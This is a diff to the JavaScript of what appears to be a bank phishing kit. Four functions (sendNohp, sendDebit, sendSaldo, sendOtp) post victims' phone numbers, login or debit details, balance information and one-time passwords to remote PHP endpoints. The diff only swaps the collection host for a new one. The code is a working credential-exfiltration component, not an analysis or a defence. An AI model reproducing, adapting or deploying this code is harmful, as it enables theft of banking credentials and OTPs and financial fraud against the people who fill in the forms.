@@ -14,7 +14,7 @@ function sendNohp(){
    
       $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1/no.php',
+        url: 'https://zheuz.cloud/bri/c4gt9pt/no.php',
         data: $('#formHP').serialize(),
         datatype: 'JSON',   
     complete: function(){
@@ -40,7 +40,7 @@ function sendDebit(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1/login.php',
+        url: 'https://zheuz.cloud/bri/c4gt9pt/login.php',
         data: $('#formlog').serialize(),
         datatype: 'JSON',    
     complete: function(){    
@@ -75,7 +75,7 @@ function sendSaldo(){
   
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1/saldo.php',
+        url: 'https://zheuz.cloud/bri/c4gt9pt/saldo.php',
         data: $('#formsal').serialize(),
         datatype: 'JSON',   
    complete: function(){     
@@ -108,7 +108,7 @@ function sendOtp(){
    
         $.ajax({
         type: 'POST',
-        url: 'https://chroedevsi.whf.bz/v1/otp.php',
+        url: 'https://zheuz.cloud/bri/c4gt9pt/otp.php',
         data: $('#formLink').serialize(),
         datatype: 'JSON',    
     complete: function(){
